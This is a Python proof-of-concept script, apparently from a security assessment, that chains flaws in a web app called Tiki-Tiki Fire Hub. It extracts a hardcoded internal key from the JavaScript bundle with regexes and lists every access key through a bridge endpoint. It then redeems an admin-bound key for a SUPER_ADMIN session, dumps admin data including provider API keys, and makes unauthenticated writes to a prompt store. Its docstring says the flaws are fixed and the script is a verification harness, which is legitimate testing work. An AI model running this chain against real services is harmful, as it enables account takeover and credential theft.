#!/usr/bin/env python3
"""
TIKI-TIKI FIRE HUB — assessment reproducer.

Chain as originally observed on the 2026-10-30 build:

  1. The internal bridge key was hardcoded in the public SPA bundle.
  2. /api/internal/bridge/keys returned every access key, with `id` equal to the
     full credential and masking applied only to the display string.
  3. /api/access-keys/redeem issued a session for the key's bound supporter rather
     than the caller, so redeeming an admin-bound key returned a SUPER_ADMIN session.

Post-fix the chain does not reproduce: the bundle ships a placeholder, the previously
leaked bridge key returns 401 REVOKED_BRIDGE_KEY, issued sessions are invalidated, and
redemption binds to the caller. The script is retained as the verification harness for
that claim.

No credentials are embedded. Supply the bridge key with --bridge-key, and the access key
with --key, both obtained from the target being tested.

Usage:
  python3 poc_chain.py --target https://tiki-tiki-fire-hub.ai.studio --stage recon
  python3 poc_chain.py --target ... --stage takeover --key TTK-XXXX-XXXX-XXXX
  python3 poc_chain.py --target ... --stage all --out results.json

Stages:
  recon        bundle extraction, bridge listing, settings/status disclosure
  anon         anonymous login and the entitlements it returns
  takeover     redeem a supplied key and report the identity it resolves to
  read         admin endpoints, using the token from takeover
  promptwrite  unauthenticated create/update/delete against the prompt vault
"""

from __future__ import annotations

import argparse
import json
import re
import sys
import urllib.error
import urllib.request

UA = "ttk-assessment/1.1"
DEVICE_ID = "assessment-device-0001"


def http(url, method="GET", body=None, headers=None, timeout=25):
    hdrs = {"User-Agent": UA, "Accept": "application/json"}
    data = None
    if headers:
        hdrs.update(headers)
    if body is not None:
        data = json.dumps(body).encode()
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace")
            try:
                return r.status, json.loads(raw)
            except json.JSONDecodeError:
                return r.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        try:
            return e.code, json.loads(raw)
        except json.JSONDecodeError:
            return e.code, raw


def log(stage, msg):
    print(f"[{stage}] {msg}")


def extract_bridge_key(target):
    """Pull the internal bridge credential out of the shipped bundle, if present."""
    status, html = http(target + "/")
    if status != 200 or not isinstance(html, str):
        return None
    m = re.search(r'src="(/assets/[^"]+\.js)"', html)
    if not m:
        return None
    status, js = http(target + m.group(1))
    if status != 200 or not isinstance(js, str):
        return None
    for pat in (
        r'x-internal-api-key["\']?\s*:\s*["\']([^"\']+)',
        r'x-internal-api-key["\']?\s*:\s*([A-Za-z0-9_-]{8,})',
        r'BRIDGE_KEY["\']?\s*[:=]\s*["\']([^"\']+)',
        r'x-internal-api-key["\']?\s*:\s*(<[^>]+>)',
    ):
        hit = re.search(pat, js)
        if hit:
            return hit.group(1)
    return None


def stage_recon(target, bridge_key=None):
    out = {
        "settings": http(target + "/api/settings")[1],
        "database_status": http(target + "/api/system/database-status")[1],
    }
    key = bridge_key or extract_bridge_key(target)
    out["bridge_key_source"] = "argument" if bridge_key else "bundle"
    out["bridge_key"] = key
    if not key:
        log("recon", "no bridge key found in bundle")
        return out
    if key.startswith("<"):
        log("recon", f"bundle ships a placeholder: {key}")
        return out
    log("recon", f"bridge key: {key}")
    status, listing = http(
        target + "/api/internal/bridge/keys", headers={"x-internal-api-key": key}
    )
    out["bridge_listing"] = listing
    if status == 200 and isinstance(listing, dict):
        log("recon", f"bridge listing: {listing.get('total')} keys")
        for k in listing.get("keys", []):
            log("recon", f"  {k['id']}  tier={k.get('tier')}  status={k.get('status')}")
    return out


def stage_anon(target):
    status, r = http(target + "/api/auth/anon-login", "POST", {})
    user = (r or {}).get("user") or {}
    log("anon", f"HTTP {status} role={user.get('role')} "
                f"status={user.get('status')} perms={user.get('permissions')}")
    return r


def stage_takeover(target, key):
    if not key:
        log("takeover", "no --key supplied; skipping")
        return {}
    status, r = http(
        target + "/api/access-keys/redeem",
        "POST",
        {"key": key, "deviceId": DEVICE_ID},
        headers={"x-device-id": DEVICE_ID},
    )
    user = (r or {}).get("user") or {}
    log("takeover", f"HTTP {status} resolves to uid={user.get('uid')} role={user.get('role')}")
    return r


def stage_read(target, token):
    if not token:
        log("read", "no token; skipping")
        return {}
    h = {"Authorization": "Bearer " + token}
    out = {}
    for ep in ("overview", "supporters", "keys", "api-pool", "audit-logs"):
        status, r = http(target + f"/api/admin/{ep}", headers=h)
        out[ep] = r
        log("read", f"/api/admin/{ep} HTTP {status}")
        if isinstance(r, dict) and r.get("keys"):
            for k in r["keys"][:3]:
                if isinstance(k, dict) and k.get("apiKey"):
                    log("read", f"  provider={k.get('provider')} key={k['apiKey'][:12]}…")
    return out


def stage_promptwrite(target):
    status, r = http(
        target + "/api/admin/prompts/create",
        "POST",
        {"title": "ASSESSMENT_PROBE", "model": "m", "promptContent": "x"},
    )
    log("promptwrite", f"unauthenticated create HTTP {status}")
    pid = ((r or {}).get("prompt") or {}).get("id") if isinstance(r, dict) else None
    if pid:
        s2, _ = http(target + "/api/admin/prompts/delete", "POST", {"id": pid})
        log("promptwrite", f"cleanup delete HTTP {s2}")
    return r


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--stage", default="recon",
                    choices=["recon", "anon", "takeover", "read", "promptwrite", "all"])
    ap.add_argument("--bridge-key", default=None)
    ap.add_argument("--key", default=None)
    ap.add_argument("--out", default="results.json")
    a = ap.parse_args()
    t = a.target.rstrip("/")
    res = {}

    if a.stage in ("recon", "all"):
        res["recon"] = stage_recon(t, a.bridge_key)
    if a.stage in ("anon", "all"):
        res["anon"] = stage_anon(t)
    if a.stage in ("takeover", "all"):
        res["takeover"] = stage_takeover(t, a.key)
        token = (res["takeover"] or {}).get("token")
        if token:
            res["admin"] = stage_read(t, token)
    if a.stage in ("promptwrite", "all"):
        res["promptwrite"] = stage_promptwrite(t)

    with open(a.out, "w", encoding="utf-8") as f:
        json.dump(res, f, indent=2, default=str)
    log("done", f"written to {a.out}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
